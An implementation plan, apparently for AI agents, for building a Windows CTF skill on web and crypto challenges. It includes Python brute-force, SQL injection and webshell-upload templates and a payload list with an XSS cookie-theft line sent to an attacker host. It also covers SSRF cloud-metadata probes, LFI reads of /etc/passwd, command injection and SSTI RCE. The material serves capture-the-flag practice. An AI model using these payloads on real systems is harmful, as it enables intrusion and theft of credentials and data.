# CTF Windows Skill Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Create a CTF competition skill for Windows covering Web and Crypto challenge types, with ready-to-run scripts and tool guides.

**Architecture:** One SKILL.md as the routing/workflow hub, five reference files for deep-dive content. Follows the same pattern as existing skills (flutter-app-dev, kali-security). Reference files are loaded on demand by the AI assistant.

**Tech Stack:** Markdown skill files, Python script templates (pycryptodome, requests, gmpy2), PowerShell commands, Windows-native tool guides.

---

## File Structure

```
ctf-windows/
├── SKILL.md                        # Main skill workflow (~400 lines)
└── references/
    ├── flag-hunting.md             # Flag formats, regex, encoding identification (~150 lines)
    ├── tool-guide.md               # Windows tool quick reference (~200 lines)
    ├── script-templates.md         # Ready-to-use Python script templates (~300 lines)
    ├── web-challenges.md           # Web vulnerability techniques (~350 lines)
    └── crypto-challenges.md        # Cryptography attack techniques (~350 lines)
```

Dependency order: `flag-hunting.md` and `tool-guide.md` are standalone. `script-templates.md` references tool-guide. `web-challenges.md` and `crypto-challenges.md` reference all three. `SKILL.md` references all five.

---

### Task 1: Create directory structure

**Files:**
- Create: `ctf-windows/` directory
- Create: `ctf-windows/references/` directory

- [ ] **Step 1: Create directories**

```bash
mkdir -p ctf-windows/references
```

- [ ] **Step 2: Verify structure**

```bash
ls -la ctf-windows/ && ls -la ctf-windows/references/
```

Expected: Two directories exist, `references/` is empty.

---

### Task 2: Write references/flag-hunting.md

This file is foundational — other reference files point here for encoding identification and flag search patterns.

**Files:**
- Create: `ctf-windows/references/flag-hunting.md`

- [ ] **Step 1: Write flag-hunting.md**

Content must cover:

1. **Common flag formats** — table of formats with regex patterns:
   - `flag{...}`, `ctf{...}`, `FLAG{...}`, `CTF{...}`, `key{...}`, hex-encoded flags
   - Regex: `flag\{[^}]+\}`, `[fF][lL][aA][gG]\{[^}]+\}`, `ctf\{[^}]+\}`, etc.

2. **PowerShell flag search commands**:
   ```powershell
   # Search all files for flag patterns
   Get-ChildItem -Recurse -File | Select-String -Pattern "flag\{[^}]+\}" | Select-Object -ExpandProperty Matches | ForEach-Object { $_.Value }

   # Search with common variations
   Get-ChildItem -Recurse -File | Select-String -Pattern "[fF][lL][aA][gG]\{[^}]+\}|[cC][tT][fF]\{[^}]+\}|[kK][eE][yY]\{[^}]+\}"

   # Search in binary files
   Select-String -Path .\file.bin -Pattern "flag" -Encoding byte
   ```

3. **Encoding identification decision tree** — how to recognize common encodings:
   - Base64: `A-Za-z0-9+/=` ending, length divisible by 4
   - Hex: `0-9a-fA-F` only, even length
   - Base32: `A-Z2-7=` only
   - URL encoding: `%XX` patterns
   - ROT13: looks like readable text but wrong words
   - Binary: `01` only, length divisible by 8
   - Morse: `.- /` characters
   - Brainfuck: `><+-.,[]`

4. **Multi-layer decode strategy** — PowerShell/Python approach for peeling layers:
   ```python
   import base64, binascii

   def try_decode(data):
       """Try common decodings in order, return result if successful."""
       # Try base64
       try:
           decoded = base64.b64decode(data).decode()
           return ('base64', decoded)
       except: pass
       # Try hex
       try:
           decoded = bytes.fromhex(data).decode()
           return ('hex', decoded)
       except: pass
       # Try base32
       try:
           decoded = base64.b32decode(data).decode()
           return ('base32', decoded)
       except: pass
       return None
   ```

5. **Quick steganography checks** (for simple Misc challenges):
   - File type vs extension mismatch: `file` command or check magic bytes
   - EXIF data: `python -c "from PIL import Image; img=Image.open('file.png'); print(img.info)"`
   - Append data: PowerShell `Get-Content file.jpg -Encoding Byte -Tail 100`
   - ZIP embedded in image: look for `PK` magic bytes

- [ ] **Step 2: Verify file**

Check that all 5 sections above are present and code blocks use correct syntax.

---

### Task 3: Write references/tool-guide.md

Windows-native tool quick reference. Other reference files point here for tool usage details.

**Files:**
- Create: `ctf-windows/references/tool-guide.md`

- [ ] **Step 1: Write tool-guide.md**

Content must cover these five tools/environments:

1. **Burp Suite (Community Edition)**
   - Proxy setup: Browser proxy config to `127.0.0.1:8080`
   - Intercept requests: Proxy → Intercept tab
   - Repeater: Right-click → Send to Repeater (Ctrl+R)
   - Intruder: Positions markers, payload lists, attack types (Sniper, Battering ram, Pitchfork, Cluster bomb)
   - Decoder: Built-in encoding/decoding (Base64, URL, Hex, etc.)
   - Common CTF workflows: capture login request → send to Intruder for brute force

2. **CyberChef**
   - URL: `https://gchq.github.io/CyberChef/` (also works offline if downloaded)
   - Magic operation: drag in data → auto-detect encoding chains
   - Common recipes: From Base64 → From Hex, URL Decode → From Base64
   - Search: use "Find / Replace" to locate flag patterns in decoded data

3. **Python for CTF on Windows**
   - Install common packages: `pip install pycryptodome requests gmpy2 beautifulsoup4 pwntools`
   - Quick HTTP: `requests.get()`, `requests.post()`, session handling
   - Quick crypto: `from Crypto.Cipher import AES`, `from Crypto.PublicKey import RSA`
   - Quick math: `gmpy2.gcd()`, `gmpy2.invert()` for RSA attacks
   - Quick parsing: `BeautifulSoup` for HTML scraping

4. **Browser DevTools (Chrome/Edge)**
   - Network tab: view all requests/responses, check headers, cookies
   - Console: run JavaScript, test XSS payloads, decode values
   - Sources: view JS files, set breakpoints, find hardcoded secrets
   - Application tab: view cookies, localStorage, sessionStorage

5. **PowerShell for CTF**
   - File operations: `Get-Content`, `Get-ChildItem -Recurse`, file read/write
   - Regex search: `Select-String -Pattern "flag\{[^}]+\}" -Recurse`
   - Network: `Invoke-WebRequest`, `Invoke-RestMethod`
   - Encoding: `[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("..."))`
   - Hex: `[BitConverter]::ToString([byte[]][char[]]"text")`

- [ ] **Step 2: Verify file**

Check that all 5 tool sections are present with actionable commands.

---

### Task 4: Write references/script-templates.md

Ready-to-use Python scripts that work on Windows with standard CTF packages.

**Files:**
- Create: `ctf-windows/references/script-templates.md`

- [ ] **Step 1: Write script-templates.md**

Content must include these complete, runnable script templates:

1. **HTTP brute force template**
   ```python
   import requests

   url = "http://target/login"
   usernames = open("users.txt").read().splitlines()
   passwords = open("passwords.txt").read().splitlines()

   for user in usernames:
       for pwd in passwords:
           r = requests.post(url, data={"username": user, "password": pwd})
           if "incorrect" not in r.text.lower() and r.status_code == 200:
               print(f"[+] Found: {user}:{pwd}")
               break
   ```

2. **Directory brute force template**
   ```python
   import requests

   base_url = "http://target/"
   wordlist = open("wordlist.txt").read().splitlines()

   for path in wordlist:
       r = requests.get(base_url + path)
       if r.status_code != 404:
           print(f"[{r.status_code}] /{path}")
   ```

3. **RSA attack template (common attacks)**
   ```python
   from Crypto.PublicKey import RSA
   from Crypto.Util.number import long_to_bytes
   import gmpy2

   # Load public key
   key = RSA.import_key(open("pubkey.pem").read())
   n, e = key.n, key.e

   # Attack 1: Small exponent (e=3, small message)
   # c = m^e, if m^e < n then m = integer_nth_root(c)
   c = int(open("ciphertext.txt").read().strip(), 16)
   if e == 3:
       m, exact = gmpy2.iroot(c, e)
       if exact:
           print(f"[+] Small exponent attack: {long_to_bytes(m)}")

   # Attack 2: Factor with factordb or sympy
   # from sympy import factorint
   # factors = factorint(n)
   ```

4. **AES decrypt template**
   ```python
   from Crypto.Cipher import AES
   from Crypto.Util.Padding import unpad
   import base64

   key = b'16bytekey1234567'  # 16/24/32 bytes
   iv = b'16byteiv12345678'   # 16 bytes for CBC
   ciphertext = base64.b64decode("BASE64_CIPHERTEXT")

   # CBC mode
   cipher = AES.new(key, AES.MODE_CBC, iv)
   plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
   print(plaintext.decode())

   # ECB mode (no IV needed)
   # cipher = AES.new(key, AES.MODE_ECB)
   # plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
   ```

5. **Multi-layer decode template**
   ```python
   import base64, binascii, urllib.parse

   def auto_decode(data, max_depth=20):
       for i in range(max_depth):
           old = data
           # Try base64
           try:
               data = base64.b64decode(data).decode()
               print(f"[Layer {i+1}] base64: {data[:50]}...")
               continue
           except: pass
           # Try hex
           try:
               data = bytes.fromhex(data.strip()).decode()
               print(f"[Layer {i+1}] hex: {data[:50]}...")
               continue
           except: pass
           # Try URL decode
           if '%' in data:
               try:
                   data = urllib.parse.unquote(data)
                   print(f"[Layer {i+1}] url: {data[:50]}...")
                   continue
               except: pass
           if data == old:
               print(f"[Done] Final result: {data}")
               break
       return data

   data = input("Enter encoded string: ")
   result = auto_decode(data)
   ```

6. **SQL injection template**
   ```python
   import requests

   url = "http://target/vulnerable"
   # Union-based injection
   payload_template = "' UNION SELECT {}--"

   # Find column count
   for i in range(1, 20):
       cols = ",".join(["NULL"] * i)
       payload = payload_template.format(cols)
       r = requests.get(url, params={"id": payload})
       if r.status_code == 200 and "error" not in r.text.lower():
           print(f"[+] Column count: {i}")
           break
   ```

7. **File upload testing template**
   ```python
   import requests

   url = "http://target/upload"
   # Test various extensions
   extensions = [".php", ".php5", ".phtml", ".php.jpg", ".asp", ".aspx", ".jsp"]
   for ext in extensions:
       files = {"file": (f"test{ext}", b"<?php system($_GET['cmd']); ?>")}
       r = requests.post(url, files=files)
       print(f"[{r.status_code}] {ext}: {r.text[:100]}")
   ```

Each template must include a comment header explaining what it does and what to customize.

- [ ] **Step 2: Verify all scripts**

Check that all 7 templates are complete, syntactically valid Python, and include usage comments.

---

### Task 5: Write references/web-challenges.md

Web vulnerability techniques for CTF. References flag-hunting.md for encoding and tool-guide.md for tool usage.

**Files:**
- Create: `ctf-windows/references/web-challenges.md`

- [ ] **Step 1: Write web-challenges.md**

Content must cover these vulnerability types, each with the same structure: **Quick ID → Detection → Payloads → Tips**:

1. **SQL Injection**
   - Quick ID: URL parameters, login forms, search boxes, numeric IDs
   - Detection: `'`, `"`, `1'--`, `1' OR '1'='1`
   - UNION injection: column count detection, data extraction
   - Blind injection: boolean-based (`AND 1=1` vs `AND 1=2`), time-based (`SLEEP(5)`)
   - WAF bypass: `/**/`, double encoding, `/*!UNION*/`, case mixing
   - Read `references/script-templates.md` for SQLi automation script

2. **XSS (Cross-Site Scripting)**
   - Reflected: test in URL parameters, search boxes
   - Stored: test in comment fields, profile fields
   - DOM-based: check JS source for `document.location`, `innerHTML`
   - Payloads: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, `"><script>alert(1)</script>`
   - Cookie theft: `new Image().src='http://attacker/?c='+document.cookie`
   - Filter bypass: `javascript:`, event handlers (`onerror`, `onload`, `onmouseover`), encoding

3. **SSRF (Server-Side Request Forgery)**
   - Quick ID: URL input fields, image URL upload, webhook URLs
   - Internal probing: `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254` (cloud metadata)
   - Protocol abuse: `file:///etc/passwd`, `gopher://` for service interaction
   - Bypass: IP in decimal (`2130706433` for 127.0.0.1), DNS rebinding, URL encoding

4. **File Upload**
   - Extension bypass: `.php5`, `.phtml`, `.php.jpg` (double extension), `.htaccess`
   - Content-Type bypass: change MIME to `image/jpeg`
   - Magic bytes: prepend `GIF89a` or `\xFF\xD8\xFF` (JPEG header)
   - Webshell: `<?php system($_GET['cmd']); ?>` (PHP), `<?=@eval($_POST['cmd'])?>`

5. **File Inclusion (LFI/RFI)**
   - LFI: `../../../etc/passwd`, `....//....//etc/passwd`
   - PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`, `php://input`
   - Log poisoning: include `/var/log/apache2/access.log` with poisoned User-Agent
   - Windows paths: `C:\Windows\System32\drivers\etc\hosts`, `..\..\..\..\Windows\win.ini`

6. **Command Injection**
   - Quick ID: ping/traceroute forms, file operations, DNS lookup
   - Delimiters: `;`, `|`, `||`, `&&`, backticks, `$()`
   - Windows-specific: `&& dir C:\`, `| type C:\flag.txt`, `%COMSPEC% /c dir`
   - Blind: `&& ping -n 5 127.0.0.1` (time-based), `&& nslookup attacker.com`

7. **Deserialization**
   - PHP: `O:4:"User":1:{s:4:"name";s:5:"admin"}` — modify properties
   - Python pickle: `__reduce__` method for RCE
   - Quick ID: session cookies with `O:` prefix (PHP), base64+pickle patterns (Python)

8. **SSTI (Server-Side Template Injection)**
   - Detection: `{{7*7}}` → `49`, `${7*7}` → `49`, `<%= 7*7 %>`
   - Jinja2: `{{config}}`, `{{''.__class__.__mro__[1].__subclasses__()}}`
   - RCE: `{{''.__class__.__mro__[2].__subclasses__()[INDEX]('cmd',shell=True).stdout}}`
   - Quick ID: error messages mentioning Jinja2, Twig, Mako, ERB

- [ ] **Step 2: Verify all 8 vulnerability sections**

Check that each section has Quick ID, Detection, Payloads, and Tips.

---

### Task 6: Write references/crypto-challenges.md

Cryptography attack techniques for CTF. References script-templates.md for ready-to-run scripts.

**Files:**
- Create: `ctf-windows/references/crypto-challenges.md`

- [ ] **Step 1: Write crypto-challenges.md**

Content must cover these crypto types, each with the same structure: **Quick ID → Analysis → Attack Scripts → Tips**:

1. **RSA**
   - Quick ID: PEM/DER key files, large numbers (n, e, c), `openssl` output
   - Key extraction: `openssl rsa -pubin -in pubkey.pem -text -noout`
   - Common attacks:
     - Small public exponent (e=3): `gmpy2.iroot(c, e)` — when message is small
     - Common modulus: same n, different e, same message — use extended GCD
     - Wiener attack: large e, small d — continued fraction expansion
     - Fermat factorization: p and q are close — `gmpy2.isqrt(n)` based
     - Known factors: if p or q is given, derive the other
   - Tools: `pycryptodome`, `gmpy2`, `RsaCtfTool` (if available)
   - Read `references/script-templates.md` for RSA attack script template

2. **AES (Symmetric Encryption)**
   - Quick ID: 16/24/32-byte keys, block cipher, IV/nonce presence
   - ECB mode: identical blocks → identical ciphertext (detect with block comparison)
   - CBC mode: IV manipulation, padding oracle attack
   - Padding Oracle: modify IV/ciphertext byte by byte, observe padding errors
   - Key extraction: check source code, memory dumps, hardcoded values
   - Read `references/script-templates.md` for AES decrypt template

3. **Classical Ciphers**
   - **Caesar/ROT13**: frequency analysis, try all 26 shifts
     ```python
     def caesar_decode(ciphertext, shift):
         return ''.join(chr((ord(c) - ord('A') - shift) % 26 + ord('A')) if c.isalpha() else c for c in ciphertext.upper())
     ```
   - **Vigenere**: Kasiski examination or known plaintext to find key length, then frequency analysis per position
   - **Rail Fence**: try 2-10 rails, check for readable text
   - **Bacon**: only A/B or 0/1 characters, 5-char groups
   - **Morse**: dots/dashes, letters separated by space, words by slash
   - Quick ID table: characteristics of each cipher type

4. **Hashing**
   - Quick ID: fixed-length hex strings (MD5=32, SHA1=40, SHA256=64)
   - MD5/SHA1: rainbow table lookup (`https://crackstation.net/`, `https://md5decrypt.net/`)
   - Hash format identification: `$1$` (MD5 crypt), `$5$` (SHA256 crypt), `$6$` (SHA512 crypt)
   - Bcrypt: `$2a$`/`$2b$` prefix, 60 chars
   - Cracking: `hashcat` on Windows, Python `hashlib` for verification

5. **Encoding (non-crypto but common in Crypto CTF)**
   - Base family: Base16 (hex), Base32, Base64, Base85, Base91
   - URL encoding: `%XX` patterns
   - JWT: three base64 parts separated by dots — decode at `jwt.io`
   - Custom encoding: look for patterns, alphabets of specific length
   - Read `references/flag-hunting.md` for encoding identification decision tree

- [ ] **Step 2: Verify all 5 crypto sections**

Check that each section has Quick ID, Analysis, Attack Scripts, and Tips.

---

### Task 7: Write SKILL.md

The main skill file. Routes challenge types to reference files, provides the solving workflow.

**Files:**
- Create: `ctf-windows/SKILL.md`

- [ ] **Step 1: Write SKILL.md**

The file must include:

1. **YAML frontmatter**:
   ```yaml
   ---
   name: ctf-windows
   description: >
     Windows CTF competition challenge-solving assistant for Web security and Cryptography.
     Covers SQL injection, XSS, SSRF, file upload, command injection, SSTI, deserialization,
     RSA, AES, classical ciphers, hashing, and encoding challenges. Provides ready-to-run
     Python scripts and Windows-compatible commands. Use this skill whenever the user mentions
     CTF, capture the flag, CTF, flag, writeup, web challenge, crypto challenge, SQL injection,
     XSS, SSRF, RSA, AES, cryptography, encoding/decoding, Base64, Burp Suite, CyberChef,
     or describes scenarios that look like CTF challenges (login page with injection, RSA
     public key analysis, ciphertext decryption). Also trigger when the user is stuck on a
     security puzzle, needs to decode a strange string, or asks about exploiting a web
     vulnerability — even if they don't explicitly say "CTF". For Kali Linux specific tools
     (nmap, metasploit, aircrack-ng), guide the user to the kali-security skill instead.
   ---
   ```

2. **Introduction** (~20 lines):
   - What this skill does: helps solve CTF Web + Crypto challenges on Windows
   - When to use: CTF competitions, practice platforms (HackTheBox, TryHackMe, BUUCTF)
   - When to use kali-security instead: Kali-specific tools, wireless, forensics
   - Authorization note: only for legitimate CTF competition and practice environments

3. **Challenge Type Router** (~30 lines):
   Table matching user input patterns to challenge types and reference files (as specified in spec Phase 1).

4. **Solving Workflow** (~80 lines):
   Four phases as specified in spec:
   - Phase 1: Quick type identification
   - Phase 2: Info gathering (Web: probe URL, source code, headers; Crypto: identify cipher, extract key material)
   - Phase 3: Execute strategy (load reference, follow templates)
   - Phase 4: Capture flag (use flag-hunting.md techniques)

5. **Tool Quick Reference** (~40 lines):
   Compact table of tools with one-line description and reference pointer:
   | Tool | Use for | Details in |
   |------|---------|------------|
   | Burp Suite | HTTP interception, brute force | `references/tool-guide.md` |
   | CyberChef | Encoding/decoding chains | `references/tool-guide.md` |
   | Python + pycryptodome | Crypto operations | `references/tool-guide.md` |
   | Browser DevTools | JS audit, network analysis | `references/tool-guide.md` |
   | PowerShell | File search, encoding | `references/tool-guide.md` |

6. **Key Principles** (~20 lines):
   - Always try simple encoding first (many "crypto" challenges are just Base64 layers)
   - Check source code and HTTP headers before attempting complex exploits
   - Use `references/flag-hunting.md` regex patterns to search for flags in all output
   - Prefer Python scripts from `references/script-templates.md` over manual work
   - When stuck, try the next vulnerability type in the list

7. **Reference Files Section** (~10 lines):
   List all reference files with one-line descriptions.

- [ ] **Step 2: Verify SKILL.md**

- Check frontmatter has valid YAML with `name` and `description`
- Verify total line count is under 500
- Verify all 5 reference files are mentioned and correctly named
- Verify the workflow is clear and actionable

---

### Task 8: Update README.md

Add the new ctf-windows skill to the project README.

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Add row to Skills table**

In the Skills table, add:
```markdown
| [ctf-windows](./ctf-windows) | Windows CTF Web + Crypto challenge solver | Available |
```

- [ ] **Step 2: Add Skill Details section**

Add after the kali-security details:
```markdown
### ctf-windows

CTF competition challenge-solving assistant for Windows, covering:

- Web challenges: SQL injection, XSS, SSRF, file upload, command injection, SSTI, deserialization
- Crypto challenges: RSA attacks, AES mode attacks, classical ciphers, hashing, encoding
- Ready-to-run Python scripts and PowerShell commands
- Flag format identification and multi-layer decoding

References: `web-challenges.md`, `crypto-challenges.md`, `tool-guide.md`, `script-templates.md`, `flag-hunting.md`
```

- [ ] **Step 3: Verify README**

Check that the table has 3 skills and the new skill details section exists.

---

### Task 9: Final review and commit

- [ ] **Step 1: Verify complete file structure**

```bash
find ctf-windows/ -type f
```

Expected output:
```
ctf-windows/SKILL.md
ctf-windows/references/flag-hunting.md
ctf-windows/references/tool-guide.md
ctf-windows/references/script-templates.md
ctf-windows/references/web-challenges.md
ctf-windows/references/crypto-challenges.md
```

- [ ] **Step 2: Verify SKILL.md frontmatter**

Check that the frontmatter has valid YAML with `name: ctf-windows` and a `description` field.

- [ ] **Step 3: Verify reference file quality**

For each reference file, check:
- All sections from the spec are present
- Code blocks use correct syntax
- Commands are Windows-compatible (PowerShell, Python for Windows)
- Cross-references to other reference files use correct paths

- [ ] **Step 4: Commit**

```bash
git add ctf-windows/
git commit -m "ctf-windows skill: CTF Web + Crypto challenge solver for Windows"
```
